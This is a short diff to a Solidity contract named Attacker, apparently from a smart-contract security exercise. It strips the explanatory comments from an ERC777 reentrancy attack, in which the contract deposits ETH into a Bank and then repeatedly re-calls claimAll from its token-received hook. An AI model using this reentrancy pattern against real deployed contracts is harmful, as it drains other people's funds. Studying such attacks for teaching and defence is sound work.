@@ -41,10 +41,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 
 		emit Deposit(amt);
 
-		// Start by depositing ETH to get MCITR tokens
 		bank.deposit{value: amt}();
 
-		// Now call withdraw to trigger the first send of tokens, which will call tokensReceived
 		bank.claimAll();
 	}
 
@@ -72,7 +70,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 			if (depth < max_depth) {
 		depth++;
 		emit Recurse(depth);
-		bank.claimAll(); // reentrant call to Bank
+		bank.claimAll();
 	}
 	}
 
